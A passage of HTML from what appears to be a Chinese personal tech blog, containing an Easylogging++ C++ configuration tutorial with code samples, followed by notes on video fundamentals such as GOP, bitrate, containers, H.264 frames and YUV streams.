</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-3-3-使用内联配置功能"><a href="#1-3-3-使用内联配置功能" class="headerlink" title="1.3.3 使用内联配置功能"></a>1.3.3 使用内联配置功能</h4><ul>
<li>所谓的内联配置功能，就是说你可以通过使用<code>std::string</code>字符串来完成日志的配置功能，但是要注意在<code>std::string</code>字符串中加上换行符保证字符串的格式遵循配置文件中的格式。</li>
<li>比如，如果要使用内联配置功能实现和方法二中一样的输出格式，那么实现代码必须像下面这样：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char** argv)   </span><br><span class="line">&#123;  </span><br><span class="line">    /// 使用默认配置  </span><br><span class="line">    el::Configurations defaultConf;  </span><br><span class="line">    defaultConf.setToDefault();  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using inline configuration&quot;;  </span><br><span class="line">      </span><br><span class="line">    /// 重新设置INFO级别的配置项FORMAT的值  </span><br><span class="line">    defaultConf.parseFromText(&quot;*INFO:\n FORMAT = %datetime %level %msg&quot;);  </span><br><span class="line">    /// 重新设置配置  </span><br><span class="line">    el::Loggers::reconfigureLogger(&quot;default&quot;, defaultConf);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using inline configuration&quot;;  </span><br><span class="line">  </span><br><span class="line">    // 重新设置GLOBAL级别的配置项FORMAT的值  </span><br><span class="line">    defaultConf.parseFromText(&quot;*INFO:\n FORMAT = %datetime %msg&quot;);  </span><br><span class="line">    /// 重新设置配置  </span><br><span class="line">    el::Loggers::reconfigureLogger(&quot;default&quot;, defaultConf);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using inline configuration&quot;;  </span><br><span class="line">  </span><br><span class="line">    system(&quot;pause&quot;);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>仔细看上面的代码，注意每一次调用函数<code>parseFromText()</code>的参数中都包含了一个换行符 <code>“\n”</code>。假如没有这个换行符，就不能正确的解析出配置项的内容，从而会导致配置无效。</li>
<li>由于这个原因，当需要设置的配置项很多的时候，如果还使用内联配置功能完成日志的配置，就会使得代码变得凌乱复杂，而且很容易造成错误，所以尽量不要使用这种方法或者避免使用这种方法。</li>
</ul>
<h4 id="1-3-4-默认配置功能"><a href="#1-3-4-默认配置功能" class="headerlink" title="1.3.4 默认配置功能"></a>1.3.4 默认配置功能</h4><ul>
<li>如果你希望为现有的或建立的日志记录器设置一个默认的配置，你可以使用下面的这个函数：<ul>
<li><code>el::Loggers::setDefaultConfigurations(el::Configurations&amp; configurations, bool configureExistingLoggers = false)</code></li>
</ul>
</li>
<li>当你在编写大型程序或者调用同样使用<code>Easylogging++</code>的第三方库时，默认配置功能显得十分有用。这个功能使得后续任何新建的日志记录器，都将会使用默认配置；如果你希望现有的日志记录也是用默认配置，只需把函数的第二个参数设置为<code>true</code>即可。下面的代码演示了默认配置功能：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(void)  </span><br><span class="line">&#123;  </span><br><span class="line">    el::Configurations defaultConf;  </span><br><span class="line">    defaultConf.setGlobally(el::ConfigurationType::Format, &quot;[%logger] %level: %msg&quot;);  </span><br><span class="line">  </span><br><span class="line">    /// 只为新建的日志记录器设置默认配置  </span><br><span class="line">    el::Loggers::setDefaultConfigurations(defaultConf);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Set default configuration but existing loggers not updated yet&quot;;  </span><br><span class="line">  </span><br><span class="line">    /// 新建日志记录器 testDefaultConf1  </span><br><span class="line">    el::Loggers::getLogger(&quot;testDefaultConf1&quot;);  </span><br><span class="line">    CLOG(INFO, &quot;testDefaultConf1&quot;) &lt;&lt; &quot;Logging using new logger 1&quot;;  </span><br><span class="line">  </span><br><span class="line">    // 为现有的日志记录器设置默认配置  </span><br><span class="line">    el::Loggers::setDefaultConfigurations(defaultConf, true);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Existing loggers updated as well&quot;;  </span><br><span class="line">  </span><br><span class="line">    /// 新建日志记录器 testDefaultConf2  </span><br><span class="line">    el::Loggers::getLogger(&quot;testDefaultConf2&quot;);  </span><br><span class="line">    CLOG(INFO, &quot;testDefaultConf2&quot;) &lt;&lt; &quot;Logging using new logger 2&quot;;  </span><br><span class="line">  </span><br><span class="line">    system(&quot;pause&quot;);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-3-5-全局配置功能"><a href="#1-3-5-全局配置功能" class="headerlink" title="1.3.5 全局配置功能"></a>1.3.5 全局配置功能</h4><ul>
<li><p>全局配置并不是指Global级别，而是值利用全局配置文件为全部或部分，甚至是为新建的日志记录器注册配置。全局配置文件必须遵循下面的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- LOGGER ID ## Case sensitive  </span><br><span class="line">  ## Everything else is same as configuration file  </span><br><span class="line">  </span><br><span class="line">-- ANOTHER LOGGER ID  </span><br><span class="line">  ## Configuration for this logger</span><br></pre></td></tr></table></figure></li>
<li><p>语法简要说明如下：</p>
<ul>
<li><code>LOGGER ID</code>，指的是记录器ID，大小写敏感，并以两个破折号开始</li>
</ul>
</li>
<li><p>其余部分的语法规则和本文中方法一的配置文件的语法规则完全一样。</p>
</li>
<li><p>一旦你编写好了全局配置文件，你仅需使用一个函数就可以完成你的日志记录器的配置，甚至是注册一个全新的日志记录器。</p>
</li>
<li><p>需要注意的是，你不能使用空白的配置来注册新的日志记录器，也就是说在 <code>LOGGER ID</code> 下面，你至少得定义一个配置项。</p>
</li>
<li><p>下面的代码演示了全局配置功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(void)   </span><br><span class="line">&#123;  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Info log before using global configuration&quot;;  </span><br><span class="line">  </span><br><span class="line">    /// 只需一个函数即可实现全局配置功能  </span><br><span class="line">    el::Loggers::configureFromGlobal(&quot;global.conf&quot;);  </span><br><span class="line">  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Info log AFTER using global configuration&quot;;  </span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;Error log AFTER using global configuration&quot;;  </span><br><span class="line">  </span><br><span class="line">    /// 用全局配置文件中新建的日志记录器 testGlobalConf 来记录日志  </span><br><span class="line">    CLOG(TRACE, &quot;testGlobalConf&quot;) &lt;&lt; &quot;TRACE Logging using new logger&quot;;  </span><br><span class="line">    CLOG(DEBUG, &quot;testGlobalConf&quot;) &lt;&lt; &quot;DEBUG Logging using new logger&quot;;  </span><br><span class="line">    CLOG(WARNING, &quot;testGlobalConf&quot;) &lt;&lt; &quot;WARNING Logging using new logger&quot;;  </span><br><span class="line">    CLOG(ERROR, &quot;testGlobalConf&quot;) &lt;&lt; &quot;ERROR Logging using new logger&quot;;  </span><br><span class="line">    CLOG(INFO, &quot;testGlobalConf&quot;) &lt;&lt; &quot;INFO Logging using new logger&quot;;  </span><br><span class="line">  </span><br><span class="line">    system(&quot;pause&quot;);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>其中全局配置文件global.conf的内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- default   </span><br><span class="line">   *INFO:  </span><br><span class="line">      FORMAT   = &quot;%level %msg&quot;  </span><br><span class="line">      FILENAME = &quot;/tmp/logs/wow.log&quot;  </span><br><span class="line">   *ERROR:  </span><br><span class="line">      FORMAT   = &quot;%levshort %fbase:%line %msg&quot;  </span><br><span class="line">  </span><br><span class="line">        </span><br><span class="line">-- testGlobalConf  </span><br><span class="line">   *GLOBAL:  </span><br><span class="line">      FORMAT                  =   &quot;[%level | %datetime] | %msg&quot;  </span><br><span class="line">      ENABLED                 =   true  </span><br><span class="line">      TO_FILE                 =   true  </span><br><span class="line">      TO_STANDARD_OUTPUT      =   true  </span><br><span class="line">      MILLISECONDS_WIDTH      =   3</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-3-6-读取配置"><a href="#1-3-6-读取配置" class="headerlink" title="1.3.6 读取配置"></a>1.3.6 读取配置</h4><ul>
<li>在某些情况下，如果我们想要获取某一个日志记录器的当前配置，可以通过使用 <code>el::Loggers</code> 类的成员函数 <code>typedConfigurations()</code> 来实现，建议参考该类的源码，可以查看和了解更多更详细和更全面的功能接口.</li>
<li>下面的代码片段演示了该功能：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">el::Logger* defaultLogger = el::Loggers::getLogger(&quot;default&quot;);  </span><br><span class="line">/// 记录器default是否被禁用  </span><br><span class="line">bool enabled = defaultLogger-&gt;typedConfigurations()-&gt;enabled(el::Level::Info);  </span><br><span class="line">/// 记录器default的INFO级别的日志输出格式  </span><br><span class="line">std::string format =  defaultLogger-&gt;typedConfigurations()-&gt;logFormat(el::Level::Info).format();</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/OpenCV/opencv_0_%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/2024-05-22-opencv_6_%E8%A7%86%E9%A2%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/OpenCV/opencv_0_%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/2024-05-22-opencv_6_%E8%A7%86%E9%A2%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">OpenCV 视频理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OpenCV/" itemprop="url" rel="index"><span itemprop="name">OpenCV</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="GOP，-Group-of-picture"><a href="#GOP，-Group-of-picture" class="headerlink" title="GOP， Group of picture"></a>GOP， Group of picture</h3><ul>
<li>关键帧的周期，也就是两个IDR帧之间的距离，一个帧组的最大帧数，一般而言，每一秒视频至少需要使用一个关键帧，增加关键帧个数可以改善质量，但是同时增加带宽和网络负载。</li>
<li>需要说明的是，通过提高GOP值来提高图像质量是有限度的，在遇到场景切换的情况是，H.264解码器会自动强制插入一个帧，此时实际的GOP值被缩短了。另一个方面，在一个GOP中，P，B帧是由I帧预测得到的。当I帧的图像质量比较差时，会影响到一个GOP中后续的P，B帧的图像质量，直到下一个GOP开始才有可能恢复，所以GOP也不宜设置过大。</li>
</ul>
<h3 id="码率-码流"><a href="#码率-码流" class="headerlink" title="码率&#x2F;码流"></a>码率&#x2F;码流</h3><ul>
<li>码流（Data Rate）是指视频文件在单位时间内使用的数据流量，也叫码率或码流率，通俗一点的理解就是取样率，是视频编码中画面质量控制中最重要的部分，一般我们用的单位是kb&#x2F;s或者Mv&#x2F;s。</li>
<li>一般来说同样分辨率下，视频文件的码流越大，压缩比就越小，画面质量就越高。<ul>
<li>码流越大，说明单位时间内取样率越大，数据流，精度就越高，处理出来的文件就越接近原始文件，图像质量越好，画质越清晰，要求播放设备的解码能力也越高。</li>
</ul>
</li>
<li>当然，码流越大，文件体积也越大，其计算公式是：文件体积&#x3D;时间*码率&#x2F;8</li>
<li>通常来说，一个视频文件包括了画面及声音，例如一个RMVB的视频文件，里面包含了视频信息和音频信息，音频及视频都有各自不同的采样方式和比特率，也就是说，同一个视频文件，音频和视频的比特率并不是一样的，而我们所说的一个视频文件码流率大小，一般是指视频文件中音频及视频信息码流率的综合。</li>
<li>以国内最流行的RMVB视频文件为例，RMVB中的VB，指的是VBR，即Variable Bit Rate的缩写，中文含义是可变比特率，他标识RMVB采用的是动态编码的方式，把较高的采样率用于复杂的动态画面，而把较低的采样率用于静态画面，合理利用资源，达到画质与体积可兼得的效率</li>
<li>码率和取样率最根本的差别就是码率是针对源文件来讲的</li>
</ul>
<h3 id="采样率"><a href="#采样率" class="headerlink" title="采样率"></a>采样率</h3><ul>
<li>采样率，也成为采样速度或采样频率，定义了每秒从连续信号中提取并组成离散信号的采样个数，它用赫兹Hz来表示。</li>
<li>采样率是指将模拟信号转换成数字信号时采样频率，也就是单位时间内采样多少点。一个采样点数据有多少比特。</li>
<li>比特率是指每秒传送的比特数，单位为bps（bit per second），比特率越高，传送的数据越大，音质越好。</li>
<li>比特率&#x3D;采样率 * 采样位数*声道数</li>
</ul>
<h3 id="比特率"><a href="#比特率" class="headerlink" title="比特率"></a>比特率</h3><ul>
<li>比特率是指每秒传送的比特数，单位为bps (bit per second)</li>
<li>比特率越高，传送的数据越大。<strong>在视频领域，比特率通常翻译为码率</strong></li>
<li>比特率表示经过编码（压缩）后的音，视频数据每秒钟需要用多少个比特来表示，而比特就是二进制里面最小的单位，要么是0，要么是1.</li>
<li>比特率与音，视频压缩的关系，简单的说就是比特率越高，音，视频的质量就越好，但是编码后的文件就越大</li>
<li>比特率是指将数字声音，视频由模拟格式转化成数字格式的采样率，采样率越高，还原后的音质，画质就越好</li>
<li>常见编码模式：<ul>
<li>VBR(Variable Bitrate)， 动态比特率，也就是没有固定的比特率，压缩软件在压缩时根据音频数据即时确定使用什么比特率，这是以质量为前提兼顾文件大小的方式，推荐的编码模式</li>
<li>ABR(Average Bitrate)， 平均比特率，是VBR的一种插值参数。LAME针对CBR不佳的文件体积比和VBR生成文件大小补丁的特点独创了这种编码模式。ABR在指定的文件大小内，以每50帧（30帧约一秒）为一段，低频和不敏感频率使用相对低的流量，高频和大动态表现时使用高流量，可以作为VBR和CBR的一种折中选择</li>
<li>CBR（Constant Bitrate），常数比特率，指文件从头到尾都是一种位比特率，相对于VBR和ABR来说，它压缩出来的文件体积最大，而音质相对于它们来说不会有明显的提高</li>
</ul>
</li>
</ul>
<h3 id="帧速率"><a href="#帧速率" class="headerlink" title="帧速率"></a>帧速率</h3><ul>
<li>帧速率，也成为FPS(frames per second)， 是指每秒刷新的图片的帧数，也可以理解为图形处理器每秒钟能够刷新几次</li>
</ul>
<h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><ul>
<li>就是帧大小，每一帧就是一幅图像</li>
<li>计算输出文件大小公式：<ul>
<li>(音频编码率(KBit为单位)&#x2F;8 + 视频编码率(KBit为单位)&#x2F;8) * 影片总长度（秒为单位） &#x3D; 文件大小（MV为单位）</li>
</ul>
</li>
</ul>
<h3 id="图像处理-行宽-linesize-步长-stride-间距-pitch"><a href="#图像处理-行宽-linesize-步长-stride-间距-pitch" class="headerlink" title="图像处理 行宽(linesize) 步长(stride) 间距(pitch)"></a>图像处理 行宽(linesize) 步长(stride) 间距(pitch)</h3><ul>
<li><p>间距，有很多别名，在使用ffmpeg解码时，称为<code>linesize</code>；使用ffmpeg转换格式时，称为<code>stride</code></p>
</li>
<li><p>间距，在大多数情况下，其数值和图像的宽度是相同的</p>
</li>
<li><p>现在计算机的cpu都是32位或者64位，一次最少读取4个字节或者8个字节，如果少于这些，反而要做一些额外的工作，会花更长的时间，所以会有一个概念叫做<strong>内存对齐</strong>，将结构体的长度设为4或8的倍数。</p>
</li>
<li><p>间距，也是因为同样的理由出现。图像的操作通常按行操作的，如果图像的所有数据都紧密排列，那么会发生非常多次的读取非对齐内存，会影响效率</p>
</li>
<li><p>间距，就是指图像中的一行图像数据所占的存储空间的长度，它是一个<strong>大于等于图像宽度的内存对齐的长度</strong>。这样每次以行为基准读取数据的时后就能内存对齐，虽然可能会导致内存浪费，但是在内存充裕的今天已经无所谓了。</p>
</li>
</ul>
<hr>
<h2 id="图像-编码"><a href="#图像-编码" class="headerlink" title="图像 编码"></a>图像 编码</h2><h3 id="JPEG编码"><a href="#JPEG编码" class="headerlink" title="JPEG编码"></a>JPEG编码</h3><ul>
<li>参考信息<ul>
<li><code>https://zhuanlan.zhihu.com/p/145847377</code> : 海思MPP技术笔记</li>
</ul>
</li>
</ul>
<h3 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h3><ul>
<li><p>Base64 是一种编码方式，最早出现在电子邮件传输协议中。</p>
<ul>
<li>电子邮件问世之初，传递消息时只支持 ASCII 字符，后来随着电子邮件的广泛使用，传递非ASCII字符内容的需求增加，例如：传输中文、传输文件（图片、视频）。</li>
<li>为解决这一问题，最好的方案是在不改变传输协议的基础上，做一种扩展方案来支持非ASCII内容传输，</li>
<li><strong>把非 ASCII 字符用ASCII来表示，Base64编码应运而生</strong>。</li>
</ul>
</li>
<li><p>Base64 是一种基于64个 ASCII 字符来表示二进制数据的表示方法</p>
</li>
<li><p>Base64 将8比特位为一个单元的字节数据拆分为以6个比特位为一个单元的二进制片段，每6个比特位单元对应Base64索引表中的一个字符，这样最终构成一个超过编码前字节数据33%的字符串。</p>
</li>
<li><p>Base64 中64个可打印字符包括字母A-Z、a-z、数字0-9，此外还有两个字符为+和&#x2F;，这样构成了共有64字符的Base64索引表</p>
<ul>
<li><img src="/imgs/base-map.png" alt="base64-map" title="base64-map"></li>
</ul>
</li>
<li><p>为什么一些Base64后的字符中末尾有“&#x3D;&#x3D;”</p>
<ul>
<li>编码前字节数正好被3整除，转化为二进制ASCII 编码（ 3*8&#x3D;24 ）后，正好可以被6整除。</li>
<li>若编码前字节数不能被3整除，最后会余出1个或2个字节，那么编码时需要：<ul>
<li>使用 000000 字节值在末尾补足，使其字节数能够被3整除；</li>
<li>编码时补位的6个比特位单元用 &#x3D; 表示。</li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="视频基本概念"><a href="#视频基本概念" class="headerlink" title="视频基本概念"></a>视频基本概念</h2><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul>
<li>熟悉的<code>mp4, rmvb, mkv, avi</code>是多媒体容器文件格式（或称多媒体封装格式），所谓容器，**是指将不同的数据流（视频流，音频流，字幕流）封装在一个文件（载体）中。</li>
<li>播放时各种流分别进行解码等处理，然后输出到显示器和音响等设备进行播放。<strong>多媒体容器格式不同于编码格式，一个容器中可以封装多种编码格式的媒体流。</strong></li>
<li>流封装了实际的媒体数据，例如视频流，音频流和字幕流等。一般情况下，流中的数据只能使用一种编码格式。</li>
</ul>
<h3 id="帧率"><a href="#帧率" class="headerlink" title="帧率"></a>帧率</h3><ul>
<li>帧率(<code>frames per second, fps</code>)，是每秒画面刷新的次数，帧率越高视频越流畅。</li>
<li>一般来说，30<code>fps</code>就是可以接受的，60<code>fps</code>则可以明显提升交互感，但一般超过75<code>fps</code>就不容易察觉到有明显的流畅度提升了</li>
</ul>
<h3 id="分辨率-1"><a href="#分辨率-1" class="headerlink" title="分辨率"></a>分辨率</h3><ul>
<li>分辨率表示画面的精细程度，<strong>通常用像素密度来表示</strong>,常用的单位为<code>ppi</code>（像素每英尺），通常像素密度越高画面越精细，模糊程度越低</li>
<li>对于视频文件而言，像素密度是无法控制的（由播放器和显式设备决定）。我们通常<strong>用视频的向素数来表示它的分辨率</strong>，例如<code>1080x640</code>, <code>640x320</code>等</li>
</ul>
<h2 id="比特率-1"><a href="#比特率-1" class="headerlink" title="比特率"></a>比特率</h2><ul>
<li>比特率(<code>bit rate</code>)，又称码率，表示多媒体流每秒输出的字节数，单位为<code>KB/s, Kbps</code>等，同样的压缩算法，比特率越高音视频的质量越好。</li>
<li>可变码率(<code>Variable Bitrate, VBR</code>)，指的是编码其的输入码率可以根据输入源信号的复杂度进行自适应调整，以在输出质量保持不变的条件下尽可能减少数据量。VBR适用于存储，不太使用于流式传输。</li>
<li>固定码率(<code>Constant Bitrate, CBR</code>), 指的是编码器输出码率固定，CBR不适合存储，对于复杂内容可能没有足够码率进行编码，从而导致质量下降，同时会在简单内容部分浪费一些码率</li>
</ul>
<h3 id="采样率-1"><a href="#采样率-1" class="headerlink" title="采样率"></a>采样率</h3><ul>
<li>采样率，指的是每秒钟对音频信号的采样次数，采样频率越高，声音还原度越高，声音更加自然，单位是赫兹Hz</li>
<li>音频文件一般使用的采样率是44.1kHz，也就是一秒钟采样44100次，实验发现低于这个值就会由较明显的损失，而高于这个值人的耳朵已经很难分别，而且增加了数字音频所占的空间</li>
</ul>
<h3 id="视频编码"><a href="#视频编码" class="headerlink" title="视频编码"></a>视频编码</h3><ul>
<li><strong>视频流可以看作图片的序列，我们把这个序列中的一张图片称为一帧</strong>。若存储视频中所有的帧，则会导致数据量过大，不便于存储和传输。</li>
<li>统计表明大多数视频相邻帧之间的区别并不大，所以对于一段变化不大的视频，我们可以先完整编码帧A，其后的B帧只需要编码与A帧不同的部分，B帧后的C帧则只编码与B帧的差异。如此递推，将一段视频编码为一个序列。</li>
<li><strong>当某个图像与之前的图像变化很大，导致无法参考前面的帧来生成，就结束上一个序列，并且将该帧完整编码开始一个新的序列</strong></li>
<li><code>H264</code>是目前流行的一种视频编码算法，它定义了三种帧：完整编码的I帧，参考I帧只包含差异的P帧，以及参考前后帧编码的B帧</li>
<li><code>H264</code>采用的核心算法是帧内压缩和帧间压缩。<ul>
<li>帧内压缩是生成I帧的算法</li>
<li>帧间压缩是生成B帧和P帧的算法</li>
</ul>
</li>
<li>通常，把完成编码的I帧称为<strong>关键帧</strong>。因为解码非关键帧需要解码其参考的帧，因此在截图等不需要全部解码的操作中，经常截取关键帧以提升性能。</li>
</ul>
<h2 id="视频基础知识和视频格式"><a href="#视频基础知识和视频格式" class="headerlink" title="视频基础知识和视频格式"></a>视频基础知识和视频格式</h2><ul>
<li>网站上的视频，是常说的<strong>网络流媒体</strong></li>
<li>将视频缓存到本地成一个文件，是常说的<strong>本地视频文件</strong></li>
</ul>
<h3 id="视频封装格式（简称视频格式，也称为容器）"><a href="#视频封装格式（简称视频格式，也称为容器）" class="headerlink" title="视频封装格式（简称视频格式，也称为容器）"></a>视频封装格式（简称视频格式，也称为容器）</h3><ul>
<li><p>视频格式是视频播放软件为了能够播放视频文件而赋予视频文件的一种识别符号</p>
</li>
<li><p>换句话讲，视频格式规定了和播放器的通信协议</p>
</li>
<li><p>首先，<code>MP4, AVI, MKV</code>等都是本地视频文件的后缀，在wiindows系统下，用于提示操作系统应该采用哪个应用程序打开。</p>
</li>
<li><p>而在流媒体领域，这些都被称为<strong>视频封装格式</strong>，因为除了音视频流外，它们还包含了一些辅助信息以及组织音频的方式。</p>
</li>
<li><p>不同格式的视频在不同平台上用户体验不同，很大原因在于对音视频的组织方式带来的差异。</p>
</li>
<li><p>视频封装格式，是在编码的音视频基础上进行一次“包装”，添加与播放相关的协议数据。（不一定正确）</p>
</li>
</ul>
<h3 id="视频协议"><a href="#视频协议" class="headerlink" title="视频协议"></a>视频协议</h3><ul>
<li><p>视频协议，<strong>是针对网络流媒体而言的</strong>，也就是只有在有网络时通过浏览器或者移动端APP才能看到的视频，目前常见的协议有RTSP， RTMP， HLS，HTTP等</p>
</li>
<li><p>有的文章会把视频协议归入视频封装格式，因为它们都同时携带了音视频和metadata，以及协议&#x2F;格式需要的其他信息。</p>
</li>
<li><p>以FFMpeg为例，它并不区分视频格式和视频协议。</p>
</li>
</ul>
<h3 id="视频流"><a href="#视频流" class="headerlink" title="视频流"></a>视频流</h3><ul>
<li><p>常见的词语有：</p>
<ul>
<li>h264码流，yuv流，编码流，解码流，原始流，裸流，或者 未压缩的流</li>
</ul>
</li>
<li><p>归纳的讲，视频流，一定只有两种形式</p>
<ul>
<li>经过压缩算法压缩的流数据，称为<strong>编码流</strong>，又因为目前压缩&#x2F;编码算法以H264为主，因此常常称为<strong>H264码流</strong></li>
<li>未经过压缩的流数据，是解码后的流数据，称为<strong>原始流</strong>，可以想象视频是由一幅一幅在时间上连续的“图像”组成的，而因为视频内部的“图像”是YUV，因此也常常称为<strong>YUV流</strong></li>
</ul>
</li>
<li><p>总结</p>
<ul>
<li>h264码流，压缩后的流， 编码流 ： 是压缩&#x2F;编码后的视频流</li>
<li>yuv流，解码流，未压缩的流     ： 是未经过压缩&#x2F;编码的视频流</li>
<li>裸流，是一个具有歧义的词，是上下文内容，既可以是前者，也可以是后者</li>
</ul>
</li>
<li><p>因此，在阅读任何流媒体相关的文章时，看到视频流都应该搞清楚，是编码&#x2F;压缩的,还是没有</p>
<ul>
<li>在生活中，接触到的视频文件绝大部分都是编码&#x2F;压缩后的</li>
<li>在网络传输场景中，绝大部分也是编码&#x2F;压缩后的。</li>
<li><strong>只有在视频播放时，看到的是一帧帧被转码为RGB的解码后的视频流</strong></li>
</ul>
</li>
<li><p>编码&#x2F;压缩在流媒体领域是一项非常重要的技术：</p>
<ul>
<li>从<strong>H264码流</strong>到<strong>YUV流</strong>的过程称为解码，反之称为编码</li>
</ul>
</li>
</ul>
<h3 id="帧"><a href="#帧" class="headerlink" title="帧"></a>帧</h3><ul>
<li><p>流媒体领域，<strong>流</strong>很重要，流的基本元素<strong>帧</strong>同样重要。</p>
</li>
<li><p>对于视频编码&#x2F;压缩而言，它的核心是采用尽量小的空间存储一组时间上连续的帧数据</p>
</li>
<li><p>而对于视频解码而言，就是把被编码&#x2F;压缩后的一组数据尽量恢复成原来的样子。</p>
<ul>
<li>能够被100%恢复的编码&#x2F;压缩算法称为无损压缩，反之称为有损压缩</li>
</ul>
</li>
<li><p>帧，可以联想成平时看到的一幅幅“图像”，只不过我们平时接触的图片是<strong>RGB格式</strong>的，而视频帧通常是<strong>YUV格式</strong>的</p>
</li>
